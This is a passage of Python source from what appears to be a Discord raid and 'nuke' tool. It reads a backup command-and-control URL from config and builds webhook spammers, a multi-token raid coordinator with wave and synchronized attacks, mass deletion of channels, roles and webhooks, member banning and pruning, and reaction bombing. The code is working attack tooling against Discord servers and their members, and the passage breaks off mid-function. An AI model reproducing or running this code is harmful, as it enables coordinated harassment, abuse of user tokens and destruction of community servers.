try: BACKUP_C2_URL = Files.load_config().get("BackupC2")
except: BACKUP_C2_URL = None

# ═══════════════════════════════════════════════════════════════════════════════
# ADVANCED UTILITIES CLASS - Comprehensive Helper Functions
# ═══════════════════════════════════════════════════════════════════════════════

class AdvancedUtils:
    """Advanced utility functions for Discord operations"""
    
    @staticmethod
    def create_embed(title, description, color=None, fields=None, footer=None, thumbnail=None, image=None):
        """Create a Discord embed object"""
        embed = {
            "title": title,
            "description": description,
            "color": color or random.randint(0, 0xFFFFFF),
            "timestamp": datetime.datetime.utcnow().isoformat()
        }
        
        if fields:
            embed["fields"] = fields
        if footer:
            embed["footer"] = {"text": footer}
        if thumbnail:
            embed["thumbnail"] = {"url": thumbnail}
        if image:
            embed["image"] = {"url": image}
            
        return embed
    
    @staticmethod
    def calculate_permissions(permission_int):
        """Calculate permission names from permission integer"""
        permissions = {
            0x0000000001: "CREATE_INSTANT_INVITE",
            0x0000000002: "KICK_MEMBERS",
            0x0000000004: "BAN_MEMBERS",
            0x0000000008: "ADMINISTRATOR",
            0x0000000010: "MANAGE_CHANNELS",
            0x0000000020: "MANAGE_GUILD",
            0x0000000040: "ADD_REACTIONS",
            0x0000000080: "VIEW_AUDIT_LOG",
            0x0000000100: "PRIORITY_SPEAKER",
            0x0000000200: "STREAM",
            0x0000000400: "VIEW_CHANNEL",
            0x0000000800: "SEND_MESSAGES",
            0x0000001000: "SEND_TTS_MESSAGES",
            0x0000002000: "MANAGE_MESSAGES",
            0x0000004000: "EMBED_LINKS",
            0x0000008000: "ATTACH_FILES",
            0x0000010000: "READ_MESSAGE_HISTORY",
            0x0000020000: "MENTION_EVERYONE",
            0x0000040000: "USE_EXTERNAL_EMOJIS",
            0x0000080000: "VIEW_GUILD_INSIGHTS",
            0x0000100000: "CONNECT",
            0x0000200000: "SPEAK",
            0x0000400000: "MUTE_MEMBERS",
            0x0000800000: "DEAFEN_MEMBERS",
            0x0001000000: "MOVE_MEMBERS",
            0x0002000000: "USE_VAD",
            0x0004000000: "CHANGE_NICKNAME",
            0x0008000000: "MANAGE_NICKNAMES",
            0x0010000000: "MANAGE_ROLES",
            0x0020000000: "MANAGE_WEBHOOKS",
            0x0040000000: "MANAGE_EMOJIS",
        }
        
        active_perms = []
        for perm_value, perm_name in permissions.items():
            if permission_int & perm_value:
                active_perms.append(perm_name)
        
        return active_perms
    
    @staticmethod
    def snowflake_to_timestamp(snowflake_id):
        """Convert Discord snowflake ID to timestamp"""
        try:
            timestamp = ((int(snowflake_id) >> 22) + 1420070400000) / 1000
            return datetime.datetime.fromtimestamp(timestamp)
        except:
            return None
    
    @staticmethod
    def generate_invite_code(length=8):
        """Generate random Discord-style invite code"""
        chars = string.ascii_letters + string.digits
        return ''.join(random.choices(chars, k=length))
    
    @staticmethod
    def validate_webhook_url(url):
        """Validate Discord webhook URL format"""
        pattern = r'https://discord\.com/api/webhooks/\d+/[\w-]+'
        return bool(re.match(pattern, url))
    
    @staticmethod
    def extract_invite_code(text):
        """Extract invite code from Discord invite link"""
        patterns = [
            r'discord\.gg/([a-zA-Z0-9]+)',
            r'discord\.com/invite/([a-zA-Z0-9]+)',
            r'discordapp\.com/invite/([a-zA-Z0-9]+)'
        ]
        
        for pattern in patterns:
            match = re.search(pattern, text)
            if match:
                return match.group(1)
        return None
    
    @staticmethod
    def format_file_size(bytes_size):
        """Format bytes to human-readable size"""
        for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
            if bytes_size < 1024.0:
                return f"{bytes_size:.2f} {unit}"
            bytes_size /= 1024.0
        return f"{bytes_size:.2f} PB"
    
    @staticmethod
    def generate_nonce():
        """Generate Discord message nonce"""
        return str((int(time.time() * 1000) - 1420070400000) * 4194304)
    
    @staticmethod
    def create_webhook_payload(content=None, username=None, avatar_url=None, embeds=None, tts=False):
        """Create webhook message payload"""
        payload = {"tts": tts}
        
        if content:
            payload["content"] = content
        if username:
            payload["username"] = username
        if avatar_url:
            payload["avatar_url"] = avatar_url
        if embeds:
            payload["embeds"] = embeds
            
        return payload
    
    @staticmethod
    def parse_user_mention(mention_str):
        """Parse user ID from mention string"""
        match = re.search(r'<@!?(\d+)>', mention_str)
        return match.group(1) if match else None
    
    @staticmethod
    def parse_channel_mention(mention_str):
        """Parse channel ID from mention string"""
        match = re.search(r'<#(\d+)>', mention_str)
        return match.group(1) if match else None
    
    @staticmethod
    def parse_role_mention(mention_str):
        """Parse role ID from mention string"""
        match = re.search(r'<@&(\d+)>', mention_str)
        return match.group(1) if match else None
    
    @staticmethod
    def create_message_link(guild_id, channel_id, message_id):
        """Create Discord message link"""
        return f"https://discord.com/channels/{guild_id}/{channel_id}/{message_id}"
    
    @staticmethod
    def sanitize_filename(filename):
        """Sanitize filename for safe file operations"""
        invalid_chars = '<>:"/\\|?*'
        for char in invalid_chars:
            filename = filename.replace(char, '_')
        return filename
    
    @staticmethod
    def chunk_list(lst, chunk_size):
        """Split list into chunks of specified size"""
        return [lst[i:i + chunk_size] for i in range(0, len(lst), chunk_size)]
    
    @staticmethod
    def retry_with_backoff(func, max_retries=3, base_delay=1):
        """Retry function with exponential backoff"""
        for attempt in range(max_retries):
            try:
                return func()
            except Exception as e:
                if attempt == max_retries - 1:
                    raise e
                delay = base_delay * (2 ** attempt)
                time.sleep(delay)
        return None
    
    @staticmethod
    def generate_random_color():
        """Generate random hex color"""
        return random.randint(0, 0xFFFFFF)
    
    @staticmethod
    def hex_to_rgb(hex_color):
        """Convert hex color to RGB tuple"""
        hex_color = hex_color.lstrip('#')
        return tuple(int(hex_color[i:i+2], 16) for i in (0, 2, 4))
    
    @staticmethod
    def rgb_to_hex(r, g, b):
        """Convert RGB to hex color"""
        return '#{:02x}{:02x}{:02x}'.format(r, g, b)
    
    @staticmethod
    def create_progress_bar(current, total, length=20):
        """Create ASCII progress bar"""
        filled = int(length * current / total)
        bar = '█' * filled + '░' * (length - filled)
        percent = (current / total) * 100
        return f"[{bar}] {percent:.1f}%"
    
    @staticmethod
    def format_duration(seconds):
        """Format seconds to human-readable duration"""
        hours, remainder = divmod(int(seconds), 3600)
        minutes, seconds = divmod(remainder, 60)
        
        parts = []
        if hours > 0:
            parts.append(f"{hours}h")
        if minutes > 0:
            parts.append(f"{minutes}m")
        if seconds > 0 or not parts:
            parts.append(f"{seconds}s")
            
        return " ".join(parts)
    
    @staticmethod
    def export_to_json(data, filename):
        """Export data to JSON file"""
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=4, ensure_ascii=False)
            return True
        except Exception as e:
            console.log("ERROR", C["red"], "JSON Export Failed", str(e))
            return False
    
    @staticmethod
    def export_to_csv(data, filename, headers=None):
        """Export data to CSV file"""
        try:
            import csv
            with open(filename, 'w', newline='', encoding='utf-8') as f:
                if headers:
                    writer = csv.DictWriter(f, fieldnames=headers)
                    writer.writeheader()
                    writer.writerows(data)
                else:
                    writer = csv.writer(f)
                    writer.writerows(data)
            return True
        except Exception as e:
            console.log("ERROR", C["red"], "CSV Export Failed", str(e))
            return False
    
    @staticmethod
    def backup_server_data(guild_data, backup_name=None):
        """Backup server data to file"""
        if not backup_name:
            backup_name = f"backup_{int(time.time())}.json"
        
        backup_path = f"data/backups/{backup_name}"
        os.makedirs("data/backups", exist_ok=True)
        
        return AdvancedUtils.export_to_json(guild_data, backup_path)
    
    @staticmethod
    def load_backup(backup_path):
        """Load server backup from file"""
        try:
            with open(backup_path, 'r', encoding='utf-8') as f:
                return json.load(f)
        except Exception as e:
            console.log("ERROR", C["red"], "Backup Load Failed", str(e))
            return None

# ═══════════════════════════════════════════════════════════════════════════════
# MESSAGE TEMPLATES LIBRARY
# ═══════════════════════════════════════════════════════════════════════════════

class MessageTemplates:
    """Pre-built message templates for various purposes"""
    
    ANNOUNCEMENT = """
📢 **IMPORTANT ANNOUNCEMENT** 📢

{message}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
    
    WARNING = """
⚠️ **WARNING** ⚠️

{message}

Please take immediate action!
"""
    
    PROMOTION = """
🎉 **SPECIAL OFFER** 🎉

{message}

✨ Don't miss out on this amazing opportunity!
🔥 Limited time only!
"""
    
    WELCOME = """
👋 **Welcome to the server!** 👋

{message}

We're glad to have you here! 🎊
"""
    
    RULES = """
📜 **SERVER RULES** 📜

{message}

Please follow these rules to maintain a healthy community.
"""
    
    EVENT = """
🎪 **UPCOMING EVENT** 🎪

{message}

Mark your calendars! 📅
"""
    
    UPDATE = """
🔄 **UPDATE NOTIFICATION** 🔄

{message}

Stay tuned for more updates!
"""
    
    @staticmethod
    def format_template(template, message):
        """Format template with custom message"""
        return template.format(message=message)
    
    @staticmethod
    def get_all_templates():
        """Get all available templates"""
        return {
            "announcement": MessageTemplates.ANNOUNCEMENT,
            "warning": MessageTemplates.WARNING,
            "promotion": MessageTemplates.PROMOTION,
            "welcome": MessageTemplates.WELCOME,
            "rules": MessageTemplates.RULES,
            "event": MessageTemplates.EVENT,
            "update": MessageTemplates.UPDATE
        }

with open("config.json") as f:
    Config = json.load(f)

# ═══════════════════════════════════════════════════════════════════════════════
# WEBHOOK MANAGER CLASS - Advanced Webhook Operations
# ═══════════════════════════════════════════════════════════════════════════════

class WebhookManager:
    """Advanced webhook management and operations"""
    
    def __init__(self):
        self.webhooks = []
        self.session = requests.Session()
    
    def create_webhook(self, token, channel_id, name="ASTRO-NEXUS", avatar_url=None):
        """Create a new webhook in channel"""
        try:
            payload = {"name": name}
            if avatar_url:
                payload["avatar"] = avatar_url
            
            headers = {"Authorization": token}
            res = self.session.post(
                f"https://discord.com/api/v9/channels/{channel_id}/webhooks",
                headers=headers,
                json=payload
            )
            
            if res.status_code == 200:
                webhook_data = res.json()
                webhook_url = f"https://discord.com/api/webhooks/{webhook_data['id']}/{webhook_data['token']}"
                self.webhooks.append(webhook_url)
                console.log("Created", C["green"], "Webhook", webhook_url[:50] + "...")
                return webhook_url
            else:
                console.log("Failed", C["red"], "Webhook Creation", res.status_code)
                return None
        except Exception as e:
            console.log("Error", C["red"], "Webhook Creation", str(e))
            return None
    
    def delete_webhook(self, webhook_url):
        """Delete a webhook"""
        try:
            res = self.session.delete(webhook_url)
            if res.status_code == 204:
                console.log("Deleted", C["green"], "Webhook", webhook_url[:50] + "...")
                if webhook_url in self.webhooks:
                    self.webhooks.remove(webhook_url)
                return True
            return False
        except Exception as e:
            console.log("Error", C["red"], "Webhook Deletion", str(e))
            return False
    
    def send_webhook_message(self, webhook_url, content=None, username=None, avatar_url=None, embeds=None):
        """Send message via webhook"""
        try:
            payload = AdvancedUtils.create_webhook_payload(content, username, avatar_url, embeds)
            res = self.session.post(webhook_url, json=payload)
            
            if res.status_code == 204 or res.status_code == 200:
                console.log("Sent", C["green"], "Webhook Message", content[:30] if content else "Embed")
                return True
            return False
        except Exception as e:
            console.log("Error", C["red"], "Webhook Send", str(e))
            return False
    
    def spam_webhook(self, webhook_url, message, count=10, delay=0.5):
        """Spam messages via webhook"""
        sent = 0
        for i in range(count):
            if self.send_webhook_message(webhook_url, f"{message} #{i+1}"):
                sent += 1
            time.sleep(delay)
        
        console.log("Complete", C["cyan"], f"Webhook Spam", f"{sent}/{count} messages sent")
        return sent
    
    def get_all_webhooks(self, token, guild_id):
        """Get all webhooks in a guild"""
        try:
            headers = {"Authorization": token}
            res = self.session.get(
                f"https://discord.com/api/v9/guilds/{guild_id}/webhooks",
                headers=headers
            )
            
            if res.status_code == 200:
                webhooks = res.json()
                console.log("Found", C["cyan"], f"{len(webhooks)} webhooks")
                return webhooks
            return []
        except Exception as e:
            console.log("Error", C["red"], "Webhook Fetch", str(e))
            return []
    
    def delete_all_webhooks(self, token, guild_id):
        """Delete all webhooks in a guild"""
        webhooks = self.get_all_webhooks(token, guild_id)
        deleted = 0
        
        for webhook in webhooks:
            webhook_url = f"https://discord.com/api/webhooks/{webhook['id']}/{webhook.get('token', '')}"
            if self.delete_webhook(webhook_url):
                deleted += 1
            time.sleep(0.5)
        
        console.log("Complete", C["cyan"], "Webhook Purge", f"{deleted}/{len(webhooks)} deleted")
        return deleted
    
    def mass_create_webhooks(self, token, channel_id, count=10):
        """Create multiple webhooks in a channel"""
        created = []
        for i in range(count):
            webhook_url = self.create_webhook(token, channel_id, f"Hook-{i+1}")
            if webhook_url:
                created.append(webhook_url)
            time.sleep(0.3)
        
        console.log("Complete", C["cyan"], "Mass Webhook Creation", f"{len(created)}/{count} created")
        return created

# ═══════════════════════════════════════════════════════════════════════════════
# RAID COORDINATOR CLASS - Advanced Multi-Token Operations
# ═══════════════════════════════════════════════════════════════════════════════

class RaidCoordinator:
    """Coordinate complex multi-token raid operations"""
    
    def __init__(self, tokens):
        self.tokens = tokens
        self.results = {"success": 0, "failed": 0, "total": len(tokens)}
        self.start_time = None
        self.end_time = None
    
    def execute_coordinated_action(self, action_func, delay_between=0.5, max_threads=10):
        """Execute action across all tokens with coordination"""
        self.start_time = time.time()
        self.results = {"success": 0, "failed": 0, "total": len(self.tokens)}
        
        def execute_single(token):
            try:
                if action_func(token):
                    self.results["success"] += 1
                else:
                    self.results["failed"] += 1
            except Exception as e:
                self.results["failed"] += 1
                console.log("Error", C["red"], f"{token[:15]}...", str(e)[:30])
            
            time.sleep(delay_between)
        
        # Execute with threading
        from concurrent.futures import ThreadPoolExecutor
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            executor.map(execute_single, self.tokens)
        
        self.end_time = time.time()
        return self.get_statistics()
    
    def execute_wave_attack(self, action_func, wave_size=5, wave_delay=2):
        """Execute action in waves for better rate limit handling"""
        self.start_time = time.time()
        self.results = {"success": 0, "failed": 0, "total": len(self.tokens)}
        
        waves = AdvancedUtils.chunk_list(self.tokens, wave_size)
        
        for wave_num, wave in enumerate(waves, 1):
            console.log("WAVE", C["cyan"], f"Wave {wave_num}/{len(waves)}", f"{len(wave)} tokens")
            
            for token in wave:
                try:
                    if action_func(token):
                        self.results["success"] += 1
                    else:
                        self.results["failed"] += 1
                except Exception as e:
                    self.results["failed"] += 1
            
            if wave_num < len(waves):
                console.log("WAIT", C["yellow"], f"Wave Delay", f"{wave_delay}s")
                time.sleep(wave_delay)
        
        self.end_time = time.time()
        return self.get_statistics()
    
    def execute_timed_attack(self, action_func, start_timestamp):
        """Execute action at specific timestamp (synchronized attack)"""
        wait_time = start_timestamp - time.time()
        
        if wait_time > 0:
            console.log("SYNC", C["cyan"], "Waiting for sync time", f"{wait_time:.1f}s")
            time.sleep(wait_time)
        
        console.log("STRIKE", C["red"], "SYNCHRONIZED ATTACK", "EXECUTING NOW!")
        
        self.start_time = time.time()
        self.results = {"success": 0, "failed": 0, "total": len(self.tokens)}
        
        # Execute all at once
        from concurrent.futures import ThreadPoolExecutor
        with ThreadPoolExecutor(max_workers=len(self.tokens)) as executor:
            def execute_single(token):
                try:
                    if action_func(token):
                        self.results["success"] += 1
                    else:
                        self.results["failed"] += 1
                except:
                    self.results["failed"] += 1
            
            executor.map(execute_single, self.tokens)
        
        self.end_time = time.time()
        return self.get_statistics()
    
    def get_statistics(self):
        """Get raid statistics"""
        duration = self.end_time - self.start_time if self.end_time and self.start_time else 0
        success_rate = (self.results["success"] / self.results["total"] * 100) if self.results["total"] > 0 else 0
        
        stats = {
            "total": self.results["total"],
            "success": self.results["success"],
            "failed": self.results["failed"],
            "success_rate": success_rate,
            "duration": duration,
            "tokens_per_second": self.results["total"] / duration if duration > 0 else 0
        }
        
        return stats
    
    def display_statistics(self):
        """Display raid statistics"""
        stats = self.get_statistics()
        
        console.log("RAID STATISTICS", C["cyan"], "═" * 60)
        console.log("TOTAL TOKENS", C["white"], str(stats["total"]))
        console.log("SUCCESS", C["green"], str(stats["success"]))
        console.log("FAILED", C["red"], str(stats["failed"]))
        console.log("SUCCESS RATE", C["cyan"], f"{stats['success_rate']:.1f}%")
        console.log("DURATION", C["yellow"], AdvancedUtils.format_duration(stats["duration"]))
        console.log("SPEED", C["magenta"], f"{stats['tokens_per_second']:.2f} tokens/sec")
        console.log("═" * 70, C["cyan"])

# ═══════════════════════════════════════════════════════════════════════════════
# ADVANCED STATISTICS TRACKER
# ═══════════════════════════════════════════════════════════════════════════════

class StatisticsTracker:
    """Track and analyze operation statistics"""
    
    def __init__(self):
        self.operations = {}
        self.start_time = time.time()
    
    def record_operation(self, operation_name, success=True, details=None):
        """Record an operation result"""
        if operation_name not in self.operations:
            self.operations[operation_name] = {
                "total": 0,
                "success": 0,
                "failed": 0,
                "details": []
            }
        
        self.operations[operation_name]["total"] += 1
        if success:
            self.operations[operation_name]["success"] += 1
        else:
            self.operations[operation_name]["failed"] += 1
        
        if details:
            self.operations[operation_name]["details"].append(details)
    
    def get_operation_stats(self, operation_name):
        """Get statistics for specific operation"""
        if operation_name in self.operations:
            op = self.operations[operation_name]
            success_rate = (op["success"] / op["total"] * 100) if op["total"] > 0 else 0
            return {
                "total": op["total"],
                "success": op["success"],
                "failed": op["failed"],
                "success_rate": success_rate
            }
        return None
    
    def get_all_stats(self):
        """Get all operation statistics"""
        all_stats = {}
        for op_name in self.operations:
            all_stats[op_name] = self.get_operation_stats(op_name)
        return all_stats
    
    def display_summary(self):
        """Display statistics summary"""
        uptime = time.time() - self.start_time
        
        console.log("SESSION STATISTICS", C["cyan"], "═" * 60)
        console.log("UPTIME", C["white"], AdvancedUtils.format_duration(uptime))
        console.log("OPERATIONS", C["cyan"], str(len(self.operations)))
        
        for op_name, stats in self.get_all_stats().items():
            console.log(op_name.upper(), C["yellow"], 
                       f"Total: {stats['total']} | Success: {stats['success']} | Failed: {stats['failed']} | Rate: {stats['success_rate']:.1f}%")
        
        console.log("═" * 70, C["cyan"])
    
    def export_stats(self, filename="data/statistics.json"):
        """Export statistics to file"""
        stats_data = {
            "session_start": self.start_time,
            "uptime": time.time() - self.start_time,
            "operations": self.get_all_stats()
        }
        return AdvancedUtils.export_to_json(stats_data, filename)



# ═══════════════════════════════════════════════════════════════════════════════
# SERVER MANAGER CLASS - Comprehensive Server Operations
# ═══════════════════════════════════════════════════════════════════════════════

class ServerManager:
    """Advanced server management and operations"""
    
    def __init__(self, token):
        self.token = token
        self.session = requests.Session()
        self.session.headers.update({"Authorization": token})
    
    def get_server_info(self, guild_id):
        """Get detailed server information"""
        try:
            res = self.session.get(f"https://discord.com/api/v9/guilds/{guild_id}?with_counts=true")
            if res.status_code == 200:
                return res.json()
            return None
        except Exception as e:
            console.log("Error", C["red"], "Server Info", str(e))
            return None
    
    def backup_server(self, guild_id):
        """Create complete server backup"""
        try:
            backup_data = {
                "guild": self.get_server_info(guild_id),
                "channels": self.get_all_channels(guild_id),
                "roles": self.get_all_roles(guild_id),
                "emojis": self.get_all_emojis(guild_id),
                "webhooks": self.get_all_webhooks(guild_id),
                "bans": self.get_all_bans(guild_id),
                "timestamp": time.time()
            }
            
            backup_name = f"server_backup_{guild_id}_{int(time.time())}.json"
            if AdvancedUtils.backup_server_data(backup_data, backup_name):
                console.log("Success", C["green"], "Server Backup", backup_name)
                return backup_name
            return None
        except Exception as e:
            console.log("Error", C["red"], "Server Backup", str(e))
            return None
    
    def restore_server(self, guild_id, backup_path):
        """Restore server from backup"""
        try:
            backup_data = AdvancedUtils.load_backup(backup_path)
            if not backup_data:
                return False
            
            # Restore roles
            for role in backup_data.get("roles", []):
                self.create_role(guild_id, role["name"], role.get("permissions"), role.get("color"))
            
            # Restore channels
            for channel in backup_data.get("channels", []):
                self.create_channel(guild_id, channel["name"], channel["type"])
            
            console.log("Success", C["green"], "Server Restore", "Completed")
            return True
        except Exception as e:
            console.log("Error", C["red"], "Server Restore", str(e))
            return False
    
    def get_all_channels(self, guild_id):
        """Get all channels in server"""
        try:
            res = self.session.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels")
            if res.status_code == 200:
                return res.json()
            return []
        except:
            return []
    
    def get_all_roles(self, guild_id):
        """Get all roles in server"""
        try:
            res = self.session.get(f"https://discord.com/api/v9/guilds/{guild_id}/roles")
            if res.status_code == 200:
                return res.json()
            return []
        except:
            return []
    
    def get_all_emojis(self, guild_id):
        """Get all emojis in server"""
        try:
            res = self.session.get(f"https://discord.com/api/v9/guilds/{guild_id}/emojis")
            if res.status_code == 200:
                return res.json()
            return []
        except:
            return []
    
    def get_all_webhooks(self, guild_id):
        """Get all webhooks in server"""
        try:
            res = self.session.get(f"https://discord.com/api/v9/guilds/{guild_id}/webhooks")
            if res.status_code == 200:
                return res.json()
            return []
        except:
            return []
    
    def get_all_bans(self, guild_id):
        """Get all bans in server"""
        try:
            res = self.session.get(f"https://discord.com/api/v9/guilds/{guild_id}/bans")
            if res.status_code == 200:
                return res.json()
            return []
        except:
            return []
    
    def create_channel(self, guild_id, name, channel_type=0):
        """Create a channel"""
        try:
            payload = {"name": name, "type": channel_type}
            res = self.session.post(f"https://discord.com/api/v9/guilds/{guild_id}/channels", json=payload)
            if res.status_code == 201:
                console.log("Created", C["green"], "Channel", name)
                return res.json()
            return None
        except Exception as e:
            console.log("Error", C["red"], "Channel Creation", str(e))
            return None
    
    def delete_channel(self, channel_id):
        """Delete a channel"""
        try:
            res = self.session.delete(f"https://discord.com/api/v9/channels/{channel_id}")
            if res.status_code == 200:
                console.log("Deleted", C["green"], "Channel", channel_id)
                return True
            return False
        except Exception as e:
            console.log("Error", C["red"], "Channel Deletion", str(e))
            return False
    
    def create_role(self, guild_id, name, permissions=None, color=None):
        """Create a role"""
        try:
            payload = {"name": name}
            if permissions:
                payload["permissions"] = permissions
            if color:
                payload["color"] = color
            
            res = self.session.post(f"https://discord.com/api/v9/guilds/{guild_id}/roles", json=payload)
            if res.status_code == 200:
                console.log("Created", C["green"], "Role", name)
                return res.json()
            return None
        except Exception as e:
            console.log("Error", C["red"], "Role Creation", str(e))
            return None
    
    def delete_role(self, guild_id, role_id):
        """Delete a role"""
        try:
            res = self.session.delete(f"https://discord.com/api/v9/guilds/{guild_id}/roles/{role_id}")
            if res.status_code == 204:
                console.log("Deleted", C["green"], "Role", role_id)
                return True
            return False
        except Exception as e:
            console.log("Error", C["red"], "Role Deletion", str(e))
            return False
    
    def ban_member(self, guild_id, user_id, reason=None):
        """Ban a member"""
        try:
            payload = {}
            if reason:
                payload["reason"] = reason
            
            res = self.session.put(f"https://discord.com/api/v9/guilds/{guild_id}/bans/{user_id}", json=payload)
            if res.status_code == 204:
                console.log("Banned", C["green"], "Member", user_id)
                return True
            return False
        except Exception as e:
            console.log("Error", C["red"], "Ban Member", str(e))
            return False
    
    def kick_member(self, guild_id, user_id):
        """Kick a member"""
        try:
            res = self.session.delete(f"https://discord.com/api/v9/guilds/{guild_id}/members/{user_id}")
            if res.status_code == 204:
                console.log("Kicked", C["green"], "Member", user_id)
                return True
            return False
        except Exception as e:
            console.log("Error", C["red"], "Kick Member", str(e))
            return False
    
    def get_members(self, guild_id, limit=1000):
        """Get server members"""
        try:
            res = self.session.get(f"https://discord.com/api/v9/guilds/{guild_id}/members?limit={limit}")
            if res.status_code == 200:
                return res.json()
            return []
        except:
            return []
    
    def get_audit_logs(self, guild_id, limit=100):
        """Get audit logs"""
        try:
            res = self.session.get(f"https://discord.com/api/v9/guilds/{guild_id}/audit-logs?limit={limit}")
            if res.status_code == 200:
                return res.json()
            return None
        except Exception as e:
            console.log("Error", C["red"], "Audit Logs", str(e))
            return None
    
    def modify_server(self, guild_id, name=None, icon=None, banner=None):
        """Modify server settings"""
        try:
            payload = {}
            if name:
                payload["name"] = name
            if icon:
                payload["icon"] = icon
            if banner:
                payload["banner"] = banner
            
            res = self.session.patch(f"https://discord.com/api/v9/guilds/{guild_id}", json=payload)
            if res.status_code == 200:
                console.log("Modified", C["green"], "Server", guild_id)
                return True
            return False
        except Exception as e:
            console.log("Error", C["red"], "Server Modification", str(e))
            return False
    
    def prune_members(self, guild_id, days=7):
        """Prune inactive members"""
        try:
            res = self.session.post(f"https://discord.com/api/v9/guilds/{guild_id}/prune?days={days}")
            if res.status_code == 200:
                pruned = res.json().get("pruned", 0)
                console.log("Pruned", C["green"], f"{pruned} members", f"{days} days inactive")
                return pruned
            return 0
        except Exception as e:
            console.log("Error", C["red"], "Prune Members", str(e))
            return 0
    
    def mass_delete_channels(self, guild_id, channel_type=None):
        """Delete all channels (optionally filtered by type)"""
        channels = self.get_all_channels(guild_id)
        deleted = 0
        
        for channel in channels:
            if channel_type is None or channel.get("type") == channel_type:
                if self.delete_channel(channel["id"]):
                    deleted += 1
                time.sleep(0.5)
        
        console.log("Complete", C["cyan"], "Mass Channel Deletion", f"{deleted}/{len(channels)} deleted")
        return deleted
    
    def mass_delete_roles(self, guild_id):
        """Delete all roles"""
        roles = self.get_all_roles(guild_id)
        deleted = 0
        
        for role in roles:
            if not role.get("managed") and role["name"] != "@everyone":
                if self.delete_role(guild_id, role["id"]):
                    deleted += 1
                time.sleep(0.5)
        
        console.log("Complete", C["cyan"], "Mass Role Deletion", f"{deleted}/{len(roles)} deleted")
        return deleted
    
    def clone_server(self, source_guild_id, target_guild_id):
        """Clone server structure"""
        try:
            # Get source data
            source_data = {
                "channels": self.get_all_channels(source_guild_id),
                "roles": self.get_all_roles(source_guild_id)
            }
            
            # Clone roles
            for role in source_data["roles"]:
                if not role.get("managed") and role["name"] != "@everyone":
                    self.create_role(target_guild_id, role["name"], role.get("permissions"), role.get("color"))
                    time.sleep(0.3)
            
            # Clone channels
            for channel in source_data["channels"]:
                self.create_channel(target_guild_id, channel["name"], channel.get("type", 0))
                time.sleep(0.3)
            
            console.log("Success", C["green"], "Server Clone", "Completed")
            return True
        except Exception as e:
            console.log("Error", C["red"], "Server Clone", str(e))
            return False

# ═══════════════════════════════════════════════════════════════════════════════
# ENHANCED OPERATIONS CLASS - Advanced Discord Features
# ═══════════════════════════════════════════════════════════════════════════════

class EnhancedOperations:
    """Advanced enhanced operations for Discord"""
    
    def __init__(self, token):
        self.token = token
        self.session = requests.Session()
        self.session.headers.update({"Authorization": token})
    
    def reaction_bomb(self, channel_id, message_id, emojis, count=10):
        """Spam reactions on a message"""
        added = 0
        for i in range(count):
            for emoji in emojis:
                try:
                    res = self.session.put(
                        f"https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/reactions/{emoji}/@me"
                    )
                    if res.status_code == 204:
                        added += 1
                        console.log("Added", C["green"], f"Reaction {emoji}", f"#{added}")
                    time.sleep(0.3)
                except Exception as e:
                    console.log("Error", C["red"], "Reaction", str(e)[:30])
        
        console.log("Complete", C["cyan"], "Reaction Bomb", f"{added} reactions added")
        return added
    
    def remove_all_reactions(self, channel_id, message_id):
        """Remove all reactions from a message"""
        try:
            res = self.session.delete(
                f"https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/reactions"
            )
            if res.status_code == 204:
                console.log("Success", C["green"], "Removed All Reactions")
                return True
            return False
        except Exception as e:
            console.log("Error", C["red"], "Remove Reactions", str(e))
            return False
    
    def join_voice_channel(self, guild_id, channel_id):
        """Join a voice channel"""
        try:
            payload = {
                "guild_id": guild_id,
                "channel_id": channel_id,
                "self_mute": False,
                "self_deaf": False
            }
            res = self.session.post(
                f"https://discord.com/api/v9/guilds/{guild_id}/voice-states/@me",
                json=payload
            )
            if res.status_code == 204:
                console.log("Joined", C["green"], "Voice Channel", channel_id)
                return True
            return False
        except Exception as e:
            console.log("Error", C["red"], "Voice Join", str(e))
            return False
    
    def leave_voice_channel(self, guild_id):
        """Leave voice channel"""
        try:
            payload = {"channel_id": None}
            res = self.session.patch(
                f"https://discord.com/api/v9/guilds/{guild_id}/voice-states/@me",
                json=payload
            )
            if res.status_code == 204:
                console.log("Left", C["green"], "Voice Channel")
                return True
            return False
        except Exception as e:
            console.log("Error", C["red"], "Voice Leave", str(e))
            return False
    
    def set_custom_status(self, status_text, emoji=None):
        """Set custom status"""
        try:
            payload = {
                "custom_status": {
                    "text": status_text
                }
            }
            if emoji:
                payload["custom_status"]["emoji_name"] = emoji
            
            res = self.session.patch(
                "https://discord.com/api/v9/users/@me/settings",
                json=payload
            )
            if res.status_code == 200:
                console.log("Set", C["green"], "Custom Status", status_text)
                return True
            return False
        except Exception as e:
            console.log("Error", C["red"], "Set Status", str(e))
            return False
    
    def rotate_status(self, statuses, interval=60):
        """Rotate through multiple statuses"""
        console.log("Started", C["cyan"], "Status Rotation", f"{len(statuses)} statuses")
        
        while not STRIKE_EVENT.is_set():
            for status in statuses:
                if STRIKE_EVENT.is_set():
                    break
                self.set_custom_status(status)
                time.sleep(interval)
        
        console.log("Stopped", C["yellow"], "Status Rotation")
    
    def change_nickname(self, guild_id, nickname):
        """Change nickname in server"""
        try:
            payload = {"nick": nickname}
            res = self.session.patch(
                f"https://discord.com/api/v9/guilds/{guild_id}/members/@me",
                json=payload
            )
            if res.status_code == 200:
                console.log("Changed", C["green"], "Nickname", nickname)
                return True
            return False
        except Exception as e:
            console.log("Error", C["red"], "Nickname Change", str(e))
            return False
    
    def cycle_nicknames(self, guild_id, nicknames, interval=10):
        """Cycle through multiple nicknames"""
        console.log("Started", C["cyan"], "Nickname Cycling", f"{len(nicknames)} names")
        
        while not STRIKE_EVENT.is_set():
            for nick in nicknames:
                if STRIKE_EVENT.is_set():
                    break
                self.change_nickname(guild_id, nick)
                time.sleep(interval)
        
        console.log("Stopped", C["yellow"], "Nickname Cycling")
    
    def send_friend_request(self, username, discriminator):
        """Send friend request"""
        try:
            payload = {
                "username": username,
                "discriminator": int(discriminator)
            }
            res = self.session.post(
                "https://discord.com/api/v9/users/@me/relationships",
                json=payload
            )
            if res.status_code == 204:
                console.log("Sent", C["green"], "Friend Request", f"{username}#{discriminator}")
                return True
            return False
        except Exception as e:
            console.log("Error", C["red"], "Friend Request", str(e))
            return False
    
    def remove_friend(self, user_id):
        """Remove a friend"""
        try:
            res = self.session.delete(
